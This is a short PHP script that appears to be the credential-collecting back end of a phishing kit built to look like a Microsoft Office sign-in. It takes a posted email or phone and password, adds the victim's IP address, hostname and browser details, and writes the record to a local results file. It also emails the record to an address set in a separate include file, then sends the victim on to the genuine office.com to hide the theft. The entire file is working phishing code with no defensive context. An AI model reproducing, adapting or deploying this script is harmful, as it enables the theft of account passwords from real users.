<?php
if($_POST["user"] != "" and $_POST["pwd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------office Info-----------------------\n";
$message .= "Email, phone or skype            : ".$_POST['user']."\n";
$message .= "Password           : ".$_POST['pwd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp);
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.office.com/");
}else{
header ("Location: index.php");
}

?>